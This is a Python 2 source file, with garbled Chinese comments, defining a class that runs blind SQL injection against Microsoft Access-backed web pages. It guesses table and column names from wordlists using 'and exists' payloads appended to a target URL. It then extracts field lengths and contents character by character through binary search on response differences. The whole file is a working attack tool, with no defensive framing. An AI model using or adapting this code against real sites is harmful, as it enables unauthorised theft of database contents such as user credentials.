#coding=gb2312
import urllib
import string

#����Accessע�뺯��
class AccessInject():
    def __init__(self,url):
        self.url=url
        self.tableNames=[]
        self.cloumnNames=[]
        self.length=0

    #�����ȡ�����ĺ���,ʹ���ļ��½�ķ�ʽ
    #��ҪSQL���:.and exists (select * from ���ݿ����)
    def getTableName(self):
        n=0
        tablefile = open("table.txt")
        for line in tablefile.readlines():
            line = string.strip(line)
            sql = string.join(['%20and%20exists%20(select%20*%20from%20',line,')'],'')
            page=urllib.urlopen(self.url).read()
            pagex=urllib.urlopen(self.url+sql).read()
            if page==pagex:
                self.tableNames.append(line)
            else:
                continue
        if len(self.tableNames)==0:
            n=0
            print ('δ�½⵽����.')
            return n
        else:
            n=len(self.tableNames)
            print ('���ڱ�:')
            for t in self.tableNames:
                print (t)
            return n
        print ('')

    #�����ȡ�����ĺ���
    #��ҪSQL���:and exists (select �ֶ��� from ����)
    def getColumnName(self,TN):
        column = open("columns.txt")
        for columnline in column.readlines():
            columnline = string.strip(columnline)
            sql = string.join(['%20and%20exists%20(select%20',columnline,'%20from%20',TN,')'],'')
            page=urllib.urlopen(self.url).read()
            pagex=urllib.urlopen(self.url+sql).read()
            if page==pagex:
                self.cloumnNames.append(columnline)
            else:
                continue
        if len(self.cloumnNames)==0:
            print ('δ�½������.')
        else:
            print ('������:')
            for c in self.cloumnNames:
                print (c)

    #�����ȡ�ֶγ��ȵĺ���
    #��Ҫʹ�ö��ַ�
    #��ҪSQL���:and (select top 1 len(�ֶ�) from ����)> n
    def getColumnLenth(self,TN,CN,f1=0,f2=36):
        page=urllib.urlopen(self.url).read()
        while f1<=f2:
            mid=(f1+f2)/2
            u=self.url+'%20and%20(select%20top%201%20len%20('
            u+=CN
            u+=')%20from%20'
            u+=TN
            u+=')>'
            ux=u+str(mid)
            pagex=urllib.urlopen(ux).read()
            if page==pagex:
                uy=u+str(mid+1)
                pagey=urllib.urlopen(uy).read()
                if page!=pagey:
                    self.length=mid+1
                    print (CN,'���ݳ���:',self.length)
                    return self.length
                    break
                else:
                    f1=mid+1
            else:
                f2=mid

     #�����ȡ�ֶ����ݵĺ���
     #��Ҫʹ�ö��ַ�
     #��ҪSQL���:and (select top 1 asc(mid(�ֶ���,1,1)) from ����)>0
    def getContent(self,TN,CN,lenth):
        content=''
        page=urllib.urlopen(self.url).read()
        for n in range(1,lenth+1):
            f1=32
            f2=128
            while f1<=f2:
                mid=(f1+f2)/2
                url=self.url+"%20and%20(select%20top%201%20asc%20(mid("
                url+=CN
                url+=','
                url+=str(n)
                url+=",1))%20from%20"
                url+=TN
                url+=")>"
                urlx=url+str(mid)
                pagex=urllib.urlopen(urlx).read()
                if page==pagex:
                    urly=url+str(mid+1)
                    pagey=urllib.urlopen(urly).read()
                    if page!=pagey:
                        content+=chr(mid+1)
                        break
                    else:
                        f1=mid
                else:
                    f2=mid
        print (CN,'����:',content)